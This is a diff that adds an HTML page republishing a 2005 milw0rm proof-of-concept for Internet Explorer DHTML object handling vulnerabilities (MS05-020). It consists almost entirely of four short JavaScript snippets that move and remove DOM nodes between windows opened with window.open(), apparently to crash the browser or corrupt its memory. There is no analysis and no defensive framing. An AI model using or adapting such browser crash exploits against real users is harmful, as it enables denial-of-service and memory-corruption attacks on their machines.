@@ -1,0 +1,26 @@
+<html>
+<head>
+<title>MS Internet Explorer DHTML Object Handling Vulns (MS05-020)</title>
+<pre>
+&lt;!-- Here are multiple Microsoft Internet Explorer DHTML Object Handling Vulnerabilities by Skylined /str0ke --&gt;
+
+&lt;SCRIPT language=&quot;javascript&quot;&gt;
+    a=document.createTextNode();try{window.open().document.appendChild(a);}catch(e){}document.removeChild(a);
+&lt;/SCRIPT&gt;
+
+&lt;SCRIPT language=&quot;javascript&quot;&gt;
+  p=document.createElement();c=window.open().document.createElement();try{c.appendChild(p);}catch(e){p.removeChild(c);};
+&lt;/SCRIPT&gt;
+
+&lt;SCRIPT language=&quot;javascript&quot;&gt;
+    try{window.open().document.appendChild(document);}catch(e){}
+&lt;/SCRIPT&gt;
+
+&lt;SCRIPT&gt;
+    try{window.open().document.appendChild(document.all[0]);}catch(e){}
+&lt;/SCRIPT&gt;
+
+# milw0rm.com [2005-04-12]
+</pre>
+</html>
+
